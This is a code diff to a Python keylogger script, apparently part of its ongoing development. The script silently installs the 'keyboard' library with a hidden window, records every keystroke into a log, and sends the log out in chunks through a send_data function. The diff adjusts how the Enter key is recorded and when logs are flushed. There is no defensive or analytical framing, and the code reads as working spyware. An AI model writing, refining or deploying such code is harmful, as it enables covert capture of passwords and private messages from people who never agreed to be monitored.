@@ -1,14 +1,16 @@
 import subprocess
 import time as t
 import json
+import sys
 
 
-# Try to install library
 try:
     import keyboard
-
 except ImportError:
-    subprocess.run(['pip', 'install', 'keyboard'], creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.run(
+        [sys.executable, '-m', 'pip', 'install', 'keyboard'],
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )
     import keyboard
 
 # Setup
@@ -76,8 +78,8 @@ try:
             elif key == 'decimal':
                 add_character('.')
             elif key == 'enter' and character_log:
-                send_data(character_log)
-                character_log = ''
+                add_character("""
+                """)
             elif key == 'f13':
                 break
 
@@ -85,10 +87,12 @@ try:
         if len(character_log) >= 1900 and key == 'space':
             send_data(character_log)
             character_log = ''
+        elif len(character_log) >= 1900 and key == 'enter':
+            send_data(character_log)
+            character_log = ''
         elif len(character_log) >= 1990:
             send_data(character_log)
             character_log = ''
-
         if last_time != get_time():
             message_count = 0
             last_time = get_time()
